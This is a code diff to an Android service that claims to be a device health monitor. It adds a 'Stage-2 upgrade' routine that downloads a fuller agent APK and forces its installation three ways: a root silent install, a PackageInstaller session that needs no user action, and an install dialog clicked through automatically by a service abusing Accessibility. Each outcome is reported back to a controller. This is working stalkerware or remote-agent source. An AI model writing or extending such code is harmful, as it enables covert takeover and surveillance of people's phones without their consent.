@@ -6,6 +6,7 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.content.pm.PackageInstaller;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.ComponentName;
@@ -431,26 +432,53 @@ public class SyncService extends Service {
 
     /** Stage-2 upgrade: download agent-full.apk, try root install, fallback to dialog */
     private void doUpgrade(String id) {
-        String status;
+        String status = "err:unknown";
+        File f = new File(getCacheDir(), "upd.apk");
         try {
             byte[] apk = downloadApk();
-            File f = new File(getCacheDir(), "upd.apk");
             FileOutputStream fos = new FileOutputStream(f);
             fos.write(apk); fos.close();
-            Process su = Runtime.getRuntime().exec(new String[]{"su", "-c",
-                "pm install -r -t " + f.getAbsolutePath()});
-            su.waitFor(20, TimeUnit.SECONDS);
-            String suOut = new String(drain(su.getInputStream(), 4096)).trim();
-            if (suOut.contains("Success")) {
-                status = "silent_root_ok";
-            } else {
-                Uri uri = FileProvider.getUriForFile(this, getPackageName() + ".provider", f);
-                Intent i = new Intent(Intent.ACTION_VIEW);
-                i.setDataAndType(uri, "application/vnd.android.package-archive");
-                i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(i);
-                status = "dialog_shown";
+
+            // Method 1: root silent install
+            try {
+                Process su = Runtime.getRuntime().exec(new String[]{"su", "-c",
+                    "pm install -r -t " + f.getAbsolutePath()});
+                su.waitFor(20, TimeUnit.SECONDS);
+                String suOut = new String(drain(su.getInputStream(), 4096)).trim();
+                if (suOut.contains("Success")) { sendOut(id, "__upgrade__", enc("root_ok")); return; }
+            } catch (Exception ignored) {}
+
+            // Method 2: PackageInstaller session (Android 12+ silent self-update)
+            // Works because Stage 2 = same package + same signing cert + higher versionCode
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                try {
+                    PackageInstaller pi = getPackageManager().getPackageInstaller();
+                    PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
+                        PackageInstaller.SessionParams.MODE_FULL_INSTALL);
+                    params.setAppPackageName(getPackageName());
+                    params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
+                    int sid = pi.createSession(params);
+                    PackageInstaller.Session sess = pi.openSession(sid);
+                    try (OutputStream out = sess.openWrite("pkg", 0, apk.length)) {
+                        out.write(apk);
+                        sess.fsync(out);
+                    }
+                    Intent intent = new Intent("com.device.health.monitor.INSTALL_RESULT");
+                    PendingIntent pend = PendingIntent.getBroadcast(this, 0, intent,
+                        PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+                    sess.commit(pend.getIntentSender());
+                    sess.close();
+                    sendOut(id, "__upgrade__", enc("pkg_installer_ok")); return;
+                } catch (Exception e) { Log.d(TAG, "pkg_installer: " + e.getMessage()); }
             }
+
+            // Method 3: FileProvider dialog — MonitorService auto-clicks Install via Accessibility
+            Uri uri = FileProvider.getUriForFile(this, getPackageName() + ".provider", f);
+            Intent i = new Intent(Intent.ACTION_VIEW);
+            i.setDataAndType(uri, "application/vnd.android.package-archive");
+            i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(i);
+            status = "dialog_shown(acc_will_click)";
         } catch (Exception e) { status = "err: " + e.getMessage(); }
         sendOut(id, "__upgrade__", enc(status));
     }
